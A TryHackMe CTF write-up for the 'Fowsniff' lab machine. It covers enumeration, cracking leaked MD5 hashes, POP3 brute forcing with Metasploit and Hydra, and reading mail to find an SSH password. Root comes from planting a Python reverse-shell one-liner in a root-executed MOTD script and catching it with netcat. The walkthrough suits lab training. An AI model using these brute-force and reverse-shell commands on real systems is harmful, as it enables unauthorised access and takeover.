# Fowsniff CTF | Write-up (THM)

![fowsniff_ctf](https://github.com/user-attachments/assets/de0f68ca-d3eb-4048-a092-f0a648951d6a)

## Enumeration
#### On deploying the machine in the room, I get the following IP address for the machine: ```10.10.157.167```
#### So lets try to find out what ports and services are open using nmap . The command I use generally for nmap is 
```
nmap -sV -vv <machine_ip>
```
#### So lets run that scan here: ```nmap -sV -vv 10.10.157.167``` and we see the following results:
![image](https://github.com/user-attachments/assets/6ebb06bc-c4f5-4590-b5b9-6a0cd87bf7f1)

#### As we can see, ports 80, 110 and 143 are the ports which seem to be open from the common ports. 
Port 80 is for HTTP. <br>
Port 110 is for POP3.<br>
Port 143 for IMAP.<br>

#### Lets take a look at the website  .
![image](https://github.com/user-attachments/assets/ca653db2-966c-4953-bf95-021068575ce5)
#### On the page we see that Fowsniff's internal system has been compromised and employee usernames and passwords may have been exposed. Also, the attackers managed to hack the official ```Twitter account @fowsniffcorp```, and sensitive information may have been exposed by the attackers through this account! Let's see if they actually did it 

#### When checking the Twitter account ```@fowsniffcorp```, we see:
![image](https://github.com/user-attachments/assets/8cc0076b-1fdb-4be5-8ff5-10c7b241feab)
#### It seems to have been hacked, as expected. The attacker seems to have leaked the passwords as can be seen in the pinned tweet. Let's open the pastebin link to see the file.

By going to [fowsniff.txt](https://github.com/berzerk0/Fowsniff/blob/main/fowsniff.txt) we get the following password hashes with email addresses:
```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!
Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!
MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P
```
#### Since these are all MD5 encrypted passwords, we can try to crack them. But before we do that, I just wanted to point out this recent tweet from the hacked FowSniff Corp account:
![image](https://github.com/user-attachments/assets/26b02afe-1716-44a1-85fd-654d317c04d9)
#### This indicates that the sysadmin has the following credentials:

stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd

## Hash Cracking
#### Let's crack this hash using an online tool, ```CrackStation```
![image](https://github.com/user-attachments/assets/c9ebf919-1fd9-4166-821b-c40e017a5958)

#### As we can see, CrackStation was able to crack all the partitions except one, which is the one for the system administrator.

#### Now lets try to see if we can brute force the pop3 login using metasploit, as asked in one of the questions in the room.
On opening ```msfconsole``` and doing ```search pop3``` , we get the first option as ```auxiliary/scanner/pop3/pop3_login``` . Seems like we can brute force email logins using this module.
Lets use this module to brute force the login. First, select that module to use using ```use auxiliary/scanner/pop3/pop3_login``` . (Tip: we can also use the module # in the search results, 0 here, like ```use 0``` to directly select the corresponding module number).

#### Now once we selected to use the module, we can show the options we need to set using ```show options``` .

![image](https://github.com/user-attachments/assets/c62ca615-6885-44a8-889e-76e83bbc103f)

#### Use Metasploit module for brute forcing the POP3 service:
```
msfconsole
use auxiliary/scanner/pop3/pop3_login
set RHOSTS (the machine we are attacking)
set USER_FILE username.txt
set PASS_FILE password.txt
run
```
![image](https://github.com/user-attachments/assets/03f4c981-785e-4d90-9ca5-1a3d2a701ce8)
POP3 Username and Password brute force results

##### it seems worked.
```
seina:scoobydoo2
```
## However, ```Hydra``` is faster
```
 hydra -L usernames.txt -P passwords.txt pop3://<machine_ip>
```

```
hydra -L usernames.txt -P passwords.txt pop3://10.10.157.167
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-20 19:05:30
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 72 login tries (l:9/p:8), ~5 tries per task
[DATA] attacking pop3://10.10.157.167/
[110][pop3] host: 10.10.157.167   login: seina   password: scoobydoo2
1 of 1 target successfully completed, 1 valid password found
```
#### We confirm that 1 account is still valid: ```seina:scoobydoo2```

#### Let's try to connect to the email service using Seina's credentials.
#### To do this, I did a quick search and found this site:  [pop3-commands](https://electrictoolbox.com/pop3-commands/)

#### So, we can execute the command ```telnet 10.10.157.167 110``` to connect to the email server using telnet.
#### After that, we can issue the command ```USER seina``` followed by the commands ```PASS scoobydoo2``` and we can see that we are logged in.
#### Now, we can execute the command ```LIST``` to see the list of emails which shows us the message summary with the message number and the byte size of the message.
#### We can do a ```RETR 1``` to retrieve the 1st message. On doing that, we see it is from ```stone@fowsniff``` and it seems its sent to all other employees.

#### From the message we get the temporary SSH password:
```
S1ck3nBluff+secureshell
```
#### Similarly, we can retrieve the second email, but we don't see anything useful in that.
#### Now, let's try to connect to the SSH login account using the Stone account using this password, as shown in the following question:
```
ssh stone@10.10.157.167
```
#### This password doesn't seem to work with ```Stone``` or ```Seina```. Let's see if it works with ```Baksteen```, as the second email was sent by them.
#### And it worked! We logged into the system as ```baksteen```.

## Privilege Escalation

#### Let's see what groups the user belongs to. We can do this using the ```groups``` command. We can see that ```baksteen``` is part of the ```user``` and baksteen groups. Let's see if there are any interesting files that can be executed by users of these groups.

#### We see an interesting file, ```/opt/cube/cube.sh``` . When we check the permissions, we see that it is owned by the ```user``` group, and we can write to this file. We can see that this file is executed by root whenever the Message of The Day file in ```/etc/update-motd.d/00-header``` is executed (whenever we log into the machine via SSH), so let's include some reverse shell code inside the file. We can use the Python reverse shell provided by TryHackMe:
```
python3 -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
```
#### We can replace <IP> with the attacker's IP address (in quotes), and  with whatever port we want to receive a reverse connection on.
#### Now we can set up a netcat listener on the attacker's machine where we will receive a reverse connection: ``` nc -lvnp 4444 ```

#### Once we have everything set up, we can connect to the machine using SSH again as ``` baksteen ```.

#### And right after logging into the machine, we get a reverse shell connection again as  ``` root ``` on the netcat listener!

![image](https://github.com/user-attachments/assets/1e78a34a-f306-4e9e-b3ec-8cc9635e50ac)

Root access

#### Thank you very much for reading .
